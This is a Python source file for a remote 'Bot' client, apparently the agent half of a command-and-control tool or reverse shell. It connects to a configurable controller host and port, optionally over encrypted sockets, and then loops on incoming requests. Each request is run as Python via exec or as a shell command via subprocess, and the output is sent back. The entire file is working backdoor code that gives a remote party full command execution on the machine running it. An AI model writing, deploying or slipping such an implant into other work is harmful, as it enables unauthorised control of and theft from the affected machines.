import contextlib
import subprocess
import argparse
import os
import io

from typing import Optional
from typing import Tuple

from shared import DEFAULT_HOSTNAME
from shared import DEFAULT_PORT
from shared import DEFAULT_ENCODING
from shared import DEFAULT_LANGUAGE_CODE
from shared import LIBERAL_ENCODING_ERRORS
from shared import Platform
from shared import AsymmetricSocket
from shared import SymmetricSocket
from shared import Socket

class Execute:

    ENCODING      = DEFAULT_ENCODING
    LANGUAGE_CODE = DEFAULT_LANGUAGE_CODE
    TIMEOUT       = 60

    @staticmethod
    def code(code: str) -> str:
        assert isinstance(code, str), f'Wrong type: {code=}'

        buffer = io.StringIO()

        with contextlib.redirect_stdout(buffer):
            exec(code)

        return buffer.getvalue()

    @staticmethod
    def shell(command: str) -> Tuple[Optional[str], Optional[str]]:
        command = command.strip().replace('\n', ' && ')

        if Platform.WINDOWS and Execute.LANGUAGE_CODE:
            command = f'chcp {Execute.LANGUAGE_CODE} > nul && {command}'

        proc = subprocess.Popen(command,
                                shell=True,
                                stdin=subprocess.DEVNULL,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                encoding=Execute.ENCODING,
                                errors=LIBERAL_ENCODING_ERRORS)

        try:
            return ''.join(proc.communicate(timeout=Execute.TIMEOUT)).rstrip()
        except subprocess.TimeoutExpired as err:
            proc.kill(); return f'[BOT] ERROR :: {err}'

class Bot:

    def __init__(
        self,
        *args,
        symmetric: Optional[bool]=None,
        **kwargs
    ) -> None:
        assert isinstance(symmetric, bool) or symmetric is None, f'Wrong type: {symmetric=}'

        if symmetric is None:
            self.bot = Socket(*args)
            self.bot.set_conn()
            self.bot.set_middleware()
        elif symmetric:
            self.bot = SymmetricSocket(*args, **kwargs)
            self.bot.set_conn()
            self.bot.set_middleware()
        else:
            self.bot = AsymmetricSocket(*args, **kwargs)
            self.bot.set_conn()
            self.bot.set_middleware()

    def connect(self) -> None:
        while True:
            request = self.bot.recv()

            try:
                command, run = (request.get('request'), request.get('run'))

                assert command is not None, f'Missing attribute: {command=}'
                assert isinstance(run, bool), f'Wrong type: {run=}'

                if run:
                    response = Execute.code(command)
                elif command[:2] == 'cd':
                    os.chdir(command[2:].lstrip())
                    response = os.getcwd()
                else:
                    response = Execute.shell(command)

                self.bot.send({'response': response})
            except Exception as err:
                self.bot.send({'response': f'[BOT] ERROR :: {err}'})

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--hostname', default=DEFAULT_HOSTNAME)
    parser.add_argument('--port', type=int, default=DEFAULT_PORT)
    parser.add_argument('--password')
    parser.add_argument('--salt')
    parser.add_argument('--pubk_data')
    args = parser.parse_args()

    if args.password and args.salt:
        options = {'symmetric': True, 'password': args.password, 'salt': args.salt}
    elif args.pubk_data:
        options = {'symmetric': False, 'public_key_data': args.pubk_data}
    else:
        options = {}

    bot = Bot(args.hostname, args.port, **options)
    bot.connect()
